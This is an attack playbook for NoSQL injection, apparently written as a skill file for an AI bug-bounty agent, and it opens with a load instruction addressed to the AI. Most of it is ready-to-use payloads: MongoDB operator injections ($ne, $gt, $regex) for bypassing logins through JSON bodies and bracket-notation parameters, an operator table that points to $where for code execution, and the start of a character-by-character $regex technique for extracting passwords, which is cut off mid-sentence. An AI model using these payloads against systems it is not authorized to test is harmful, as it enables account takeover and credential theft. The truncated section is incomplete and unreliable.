---
name: nosql-injection
description: NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse.
scope: web2
---
NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse.

# SKILL: NoSQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: NoSQL injection is fundamentally different from SQL injection. Covers MongoDB operator injection, authentication bypass, blind extraction, aggregation pipeline injection, and Redis/CouchDB specific attacks. Very commonly missed by testers who only know SQLi patterns.

---

## 1. CORE CONCEPT — OPERATOR INJECTION

**SQL Injection** breaks out of string literals.  
**NoSQL Injection** injects **query operators** that change query logic.

MongoDB example — normal query:
db.users.find({username: "alice", password: "secret"})

Injection via JSON operator:
{
  "username": "admin",
  "password": {"$gt": ""}
}
→ Becomes: find({username:"admin", password:{$gt:""}}) → password > "" → always true!

---

## 2. MONGODB — LOGIN BYPASS

### JSON Body Injection (API with JSON Content-Type)
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}

### PHP $_POST Array Injection (URL-encoded form)
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*

### Ruby / Python params Array Injection
Same as PHP — use bracket notation to inject objects:
?username[%24ne]=invalid&password[%24ne]=invalid
%24 = URL-encoded $

---

## 3. MONGODB OPERATORS FOR INJECTION

| Operator | Meaning | Use Case |
|---|---|---|
| $ne | not equal | {"password": {"$ne": "x"}} → always matches |
| $gt | greater than | {"password": {"$gt": ""}} → all non-empty passwords match |
| $gte | greater or equal | Similar to $gt |
| $lt | less than | {"password": {"$lt": "~"}} → all ASCII match |
| $regex | regex match | {"username": {"$regex": "adm.*"}} |
| $where | JS expression | MOST DANGEROUS — code execution |
| $exists | field exists | {"admin": {"$exists": true}} |
| $in | in array | {"username": {"$in": ["admin","user"]}} |

---

## 4. BLIND DATA EXTRACTION VIA $REGEX

Like binary search in SQLi, use $regex to extract field values character by character:

// Does admin's password start with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}

// Does admin's password st
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/nosql-injection/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
